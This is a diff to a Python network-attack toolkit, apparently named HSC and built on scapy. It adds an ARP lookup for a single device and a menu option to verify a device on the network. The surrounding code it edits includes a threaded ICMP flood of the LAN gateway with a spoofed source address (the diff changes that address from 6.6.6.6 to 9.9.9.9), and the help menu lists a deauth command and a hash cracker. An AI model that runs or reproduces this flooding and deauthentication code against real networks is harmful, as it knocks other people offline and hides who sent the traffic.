@@ -101,11 +101,12 @@ class Web:
 
 
 class LAN:
-    def __init__(self, mac: str = None):
+    def __init__(self, mac: str = None, target_ip=None):
         self.gateway = ''.join([i for i in re.findall(r'(?<=via)\s\d+\.\d+\.\d+\.\d+', os.popen('ip r').read())])
         self.mac = mac
+        self.target = target_ip
 
-    def list_devices(self):
+    def list_devices(self) -> list:
         target = f"{self.gateway.strip()}/24"
         arp = ARP(pdst=target)
         broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
@@ -121,14 +122,27 @@ class LAN:
 
     def lan_saturation(self, msg: str = "HSC advices you to go offline and play outside."):
         for i in range(100):
-            send(IP(src='6.6.6.6', dst=self.gateway.strip()) / ICMP() / msg)
-            send(IP(src='6.6.6.6', dst=self.gateway.strip()) / ICMP() / msg)
+            send(IP(src='9.9.9.9', dst=self.gateway.strip()) / ICMP() / msg)
+            send(IP(src='9.9.9.9', dst=self.gateway.strip()) / ICMP() / msg)
+
+    def list_single_device(self) -> list:
+        arp = ARP(pdst=self.target)
+        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
+        packet = broadcast / arp
+        result = srp(packet, timeout=3, verbose=False)[0]
+
+        devices = []
+
+        for sent, received in result:
+            devices.append({"IP": received.psrc, "MAC": received.hwsrc})
+
+        return devices
 
     def saturate_lan(self, thread_amount: int):
         threads = []
 
         for i in range(thread_amount):
-            yield f"Hitting {self.gateway.strip()} on 6.6.6.6"
+            yield f"Hitting {self.gateway.strip()} on 9.9.9.9"
             thread = threading.Thread(target=self.lan_saturation)
             thread.daemon = False
             threads.append(thread)
@@ -185,6 +199,10 @@ class HashCracker:
 
 
 class Hash:
+    """
+    This is a class for
+    hashing strings.
+    """
     def __init__(self, string: str):
         self.string = string
 
@@ -487,6 +505,16 @@ def network_module():
             print('IP\t\tMAC')
             print(device['IP'], device['MAC'])
 
+    def verify_device():
+        target = input("network(target-address)>> ")
+        lan = LAN(target_ip=target)
+        if not lan.list_single_device():
+            print("Device not found.")
+        else:
+            mac_address = lan.list_single_device()[0]['MAC']
+            ip_address = lan.list_single_device()[0]['IP']
+            print(f"{ip_address} -> {mac_address}")
+
     def _help():
         print("""
             1. gateway_addr (gives gateway addr).
@@ -497,6 +525,7 @@ def network_module():
             6. back (goes back to category selection). 
             7. deauth (Deauths a MAC address).
             8. rand_mac (generates random mac address).
+            9. verify_network_device (looks for a specific device.).
             
             You can say __cancel__ to cancel an option.
             """)
@@ -526,6 +555,8 @@ def network_module():
             fetch_all_devices()
         elif cmd == 'clear':
             clear_and_renew()
+        elif cmd == 'verify_network_device':
+            verify_device()
         elif cmd == 'exit':
             exit(0)
         elif cmd == 'help':
